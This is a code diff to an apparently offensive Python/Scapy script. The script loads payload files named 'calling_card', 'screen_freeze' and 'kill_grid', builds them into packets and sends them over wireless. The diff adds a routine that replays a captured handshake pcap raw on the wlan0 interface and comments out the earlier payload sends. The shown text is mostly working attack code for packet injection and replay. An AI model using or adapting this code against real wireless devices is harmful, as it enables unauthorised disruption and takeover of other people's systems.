@@ -15,6 +15,7 @@ pwn_payload_paths = [
     './payloads/screen_freeze.json',
     './payloads/kill_grid.json'
 ]
+handshake_path = './data/handshake.pcap'
 
 def get_payload_data(payload_file_name):
     f = open(payload_file_name)
@@ -28,6 +29,10 @@ def get_random_identity():
 def get_pwn_packet():
     pwn_packet = rdpcap(pwn_packet_path)
     return pwn_packet[0]
+
+def get_handshake_packets():
+    handshake_packets = rdpcap(handshake_path)
+    return handshake_packets
 
 def send_calling_card():
     calling_card_payload = get_payload_data(pwn_payload_paths[CALLING_CARD_PAYLOAD])
@@ -115,9 +120,20 @@ def load_payload_into_packet(packet, payload_chunks):
             last_elt.add_payload(new_elt)
             last_elt = new_elt
 
+def replay_handshake():
+    handshake_packets = get_handshake_packets()
+    for i in  range(0, len(handshake_packets)):
+        packet = handshake_packets[i]
 
-send_calling_card()
-sleep(5)
-send_screen_freeze()
-sleep(5)
-send_kill_grid()
+        print(packet.show())
+        sendp(packet, loop=0, count=1, iface="wlan0", verbose=True)
+    
+
+
+# send_calling_card()
+# sleep(5)
+# send_screen_freeze()
+# sleep(5)
+# send_kill_grid()
+
+replay_handshake()
